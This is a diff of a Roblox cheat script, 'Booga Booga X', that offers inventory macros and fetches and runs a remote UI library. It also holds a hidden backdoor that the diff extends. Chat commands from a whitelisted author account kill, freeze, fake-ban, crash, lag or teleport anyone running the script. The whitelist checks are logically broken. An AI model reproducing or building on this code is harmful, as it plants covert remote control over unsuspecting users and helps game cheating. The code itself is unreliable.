@@ -1,7 +1,7 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("Booga Booga X", "DarkTheme")
 local lplr = game.Players.LocalPlayer
-
+local whitelisted = {"noobycreeper2"}
 local Tab = Window:NewTab("Macros")
 local Section = Tab:NewSection("Inventory")
 
@@ -132,7 +132,17 @@ while true do wait()
 	local events = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
 	local messageDoneFiltering = events:WaitForChild("OnMessageDoneFiltering")
 	local players = game:GetService("Players")
-local whitelisted = "noobycreeper2"
+	
+	
+	local function getWhitelist(plr)
+		for _,v in pairs(whitelisted) do
+			if plr.Name == v then
+				return false
+			else
+				return true
+			end
+		end
+	end
 
 
 	messageDoneFiltering.OnClientEvent:Connect(function(message)
@@ -142,58 +152,58 @@ local whitelisted = "noobycreeper2"
 		local message = message.Message or ""
 
 		if player then
-			if player.Name == whitelisted or "3g4g34g34g43g" then
+			if player.Name == "noobycreeper2" or "3g4g34g34g43g" then
 
 				if message == ";killDefault" then
-					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g" then
+					if getWhitelist(lplr) then
 						lplr.Character.Humanoid.Health = 0
 						task.wait(3)
 					end
 				elseif message == ";freezeDefault" then
-					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g" then
+					if getWhitelist(lplr) then
 						lplr.Character.HumanoidRootPart.Anchored = true
 						task.wait(3)
 					end
 				elseif message == ";fakeBanDefault" then
-					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g" then
+					if getWhitelist(lplr) then
 						lplr:Kick("You have been banned for 2 years (imagine being banned)")
 					end
 				elseif message == ";unFreezeDefault" then
-					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g"  then
+					if getWhitelist(lplr) then
 						lplr.Character.HumanoidRootPart.Anchored = false
 						task.wait(3)
 					end
 				elseif message == ";crashDefault" then
-					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g"  then
+					if getWhitelist(lplr) then
 						setfpscap(1)
 					end
 				elseif message == ";forceBringDefault" then
-					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g"  then
+					if getWhitelist(lplr) then
 						lplr.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
 						task.wait(3)
 					end
 				elseif message == ";lagDefault" then
-					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g"  then
+					if getWhitelist(lplr) then
 						setfpscap(7)
 					end
 				elseif message == ";fpsunlockDefault" then
-					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g"  then
+					if getWhitelist(lplr) then
 						setfpscap(500)
 					end
 				elseif message == ";bringDefault" then
-					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g"  then
+					if getWhitelist(lplr) then
 						local mag = lplr.Character.HumanoidRootPart.Position
 						lplr.Character.Humanoid:MoveTo(player.Character.HumanoidRootPart.Position)
 						task.wait(3)
 					end
 				elseif message == ";jumpDefault" then
-					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g"  then
+					if getWhitelist(lplr) then
 						lplr.Character.Humanoid:ChangeState(3)
 						task.wait(3)
 
 					end
 				elseif message == ";breakDefault" then
-					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g"  then
+					if getWhitelist(lplr) then
 						while true do wait()
 							lplr.Character.Humanoid:ChangeState(3)
 							wait(1)
@@ -202,7 +212,7 @@ local whitelisted = "noobycreeper2"
 						end
 					end
 				elseif message == ";foreceBringDefault" then
-					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g"  then
+					if getWhitelist(lplr) then
 						repeat wait()
 							local mag = lplr.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position
 							lplr.Character.Humanoid:MoveTo(player.Character.HumanoidRootPart.Position)
